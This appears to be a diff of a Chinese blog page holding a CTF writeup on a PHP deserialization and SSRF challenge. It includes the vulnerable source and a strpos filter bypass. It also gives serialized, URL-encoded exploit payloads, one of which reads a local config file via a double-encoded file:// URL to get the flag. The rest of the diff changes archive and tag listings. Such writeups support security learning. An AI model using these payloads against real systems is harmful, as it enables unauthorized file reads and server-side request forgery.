@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">589</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">590</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -405,14 +405,26 @@ height:50vh;
     <article class="article-entry">
         <p><strong>题目所给源码</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//require_once 'config.php';</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">SHITS</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $url;</span><br><span class="line">		<span class="keyword">private</span> $method;</span><br><span class="line">		<span class="keyword">private</span> $addr;</span><br><span class="line">		<span class="keyword">private</span> $host;</span><br><span class="line">		<span class="keyword">private</span> $name;</span><br><span class="line">	</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method,$url)</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">doit</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;host = @parse_url(<span class="keyword">$this</span>-&gt;url)[<span class="string">'host'</span>];</span><br><span class="line">			<span class="keyword">$this</span>-&gt;addr = @gethostbyname(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = @gethostbyaddr(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;addr !== <span class="string">"127.0.0.1"</span> || <span class="keyword">$this</span>-&gt;name === <span class="keyword">false</span>)&#123;</span><br><span class="line">				$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line">				<span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">					$p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line">					<span class="keyword">if</span>($p)&#123;</span><br><span class="line">						<span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				$ch = curl_init();</span><br><span class="line">				curl_setopt($ch,CURLOPT_URL,<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">				curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">		</span><br><span class="line">				$result = curl_exec($ch);</span><br><span class="line">				<span class="keyword">echo</span> $result;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(in_array(<span class="keyword">$this</span>-&gt;method,<span class="keyword">array</span>(<span class="string">"doit"</span>)))&#123;</span><br><span class="line">				call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="keyword">$this</span>-&gt;method),<span class="keyword">array</span>());</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"gg"</span>])) &#123;</span><br><span class="line">		@unserialize($_GET[<span class="string">"gg"</span>]);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p>打开 <code>config.php</code> ，出现 awn…<br>猜想 <code>flag</code> 在 <code>config.php</code> 中，并且有访问限制，构造 <code>ssrf</code> 进行访问，然而还是啥都没有，与外网直接访问的界面一样<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">    $p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line">    <span class="keyword">if</span>($p)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>此处可构造   <a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">绕过方法参考</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@68.183.31.62:991/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@localhost/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'localhost/config%2ephp'</span>);</span><br><span class="line">$ser = serialize($gg);</span><br><span class="line"><span class="keyword">echo</span> urlencode($ser) .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($ser);</span><br></pre></td></tr></table></figure></p>
-<p>得到：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>SHITS%<span class="number">22</span>%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>url%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22.</span>php%<span class="number">4068.183</span><span class="number">.31</span><span class="number">.62</span>%<span class="number">3</span>A991%<span class="number">2</span>Fco</span><br><span class="line">nfig.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>method%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>doit%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>addr%<span class="number">22</span>%<span class="number">3</span>B</span><br><span class="line">N%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>host%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></p>
-<p>先URL编码，若序列化后直接反序列化，某些特殊符号的编码问题会引起<code>length</code>混乱，出现 <code>unserialize(): Error at offset 错误</code>，<br>也可以进行其他的编码，比如 base64，但是需要改代码，这里利用 web 特性，<code>url 编码</code>最方便</p>
+
+<p>打开 <code>config.php</code> ，出现 awn…<br>猜想 <code>flag</code> 在 <code>config.php</code> 中，并且有访问限制，构造 <code>ssrf</code> 进行访问，然而还是啥都没有，与外网直接访问的界面一样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">    $p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line">    <span class="keyword">if</span>($p)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处可构造   <a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">绕过方法参考</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@68.183.31.62:991/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@localhost/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'localhost/config%2ephp'</span>);</span><br><span class="line">$ser = serialize($gg);</span><br><span class="line"><span class="keyword">echo</span> urlencode($ser) .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($ser);</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>SHITS%<span class="number">22</span>%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>url%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22.</span>php%<span class="number">4068.183</span><span class="number">.31</span><span class="number">.62</span>%<span class="number">3</span>A991%<span class="number">2</span>Fco</span><br><span class="line">nfig.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>method%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>doit%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>addr%<span class="number">22</span>%<span class="number">3</span>B</span><br><span class="line">N%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>host%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>先URL编码，若序列化后直接反序列化，某些特殊符号的编码问题会引起<code>length</code>混乱，出现 <code>unserialize(): Error at offset 错误</code>，
+也可以进行其他的编码，比如 base64，但是需要改代码，这里利用 web 特性，<code>url 编码</code>最方便</p>
 <p>但是并没有什么卵用</p>
 <p>还是得 <code>file:///var/www/html/config%2ephp</code> 二次编码绕过 <code>.</code></p>
-<p><strong>exp</strong>：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O<span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%22</span>SHITS<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">10</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>url<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">33</span><span class="symbol">%3</span>A<span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="symbol">%2</span>Fvar<span class="symbol">%2</span>Fwww</span><br><span class="line"><span class="symbol">%2</span>Fhtml<span class="symbol">%2</span>Fconfig<span class="symbol">%252</span>ephp<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>method<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">4</span><span class="symbol">%3</span>A<span class="symbol">%22</span>doit<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span></span><br><span class="line"><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>addr<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>host<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>name<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>B<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure></p>
-<p>读取 <code>config.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'::1'</span> || $_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"aaawn"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$flag =<span class="string">"F#&#123;wtf_5trp0s_&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>exp</strong>：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O<span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%22</span>SHITS<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">10</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>url<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">33</span><span class="symbol">%3</span>A<span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="symbol">%2</span>Fvar<span class="symbol">%2</span>Fwww</span><br><span class="line"><span class="symbol">%2</span>Fhtml<span class="symbol">%2</span>Fconfig<span class="symbol">%252</span>ephp<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>method<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">4</span><span class="symbol">%3</span>A<span class="symbol">%22</span>doit<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span></span><br><span class="line"><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>addr<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>host<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>name<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>B<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>读取 <code>config.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'::1'</span> || $_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"aaawn"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$flag =<span class="string">"F#&#123;wtf_5trp0s_&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>观察代码，此处的 <code>||</code>，能到 else 吗，出题人真阴险 :)</p>
 <p>其实可以这样，不需要所有属性，只要前两个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3</span><br></pre></td></tr></table></figure></p>
 
@@ -981,9 +993,57 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 30
+        Total : 34
         </div>
         <!-- search  -->
         
@@ -996,6 +1056,26 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/SSRF-Tips/">SSRF Tips</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化/">phar 与反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入绕过总结/">命令注入总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1163,23 +1243,29 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
-        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
     
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
